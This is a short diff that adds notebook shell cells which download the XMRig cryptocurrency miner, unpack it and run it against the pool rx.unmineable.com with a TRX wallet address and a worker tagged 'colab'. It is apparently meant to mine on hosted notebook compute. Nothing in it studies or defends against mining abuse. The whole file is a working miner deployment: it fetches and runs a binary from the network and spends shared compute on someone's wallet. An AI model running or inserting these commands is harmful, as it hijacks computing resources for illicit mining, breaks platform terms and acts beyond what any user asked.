@@ -1,0 +1,6 @@
+!wget https://github.com/xmrig/xmrig/releases/download/v6.15.1/xmrig-6.15.1-linux-x64.tar.gz
+
+! tar -xvf xmrig-6.15.1-linux-x64.tar.gz
+
+!./xmrig-6.15.1/xmrig -o rx.unmineable.com:3333 -u TRX:TMNzi3UFMhet4qHYg6AuGgoTCo7bdBpihy.colab#36s2-fnpq -p Asad -k -a rx/0 --threads=2
+
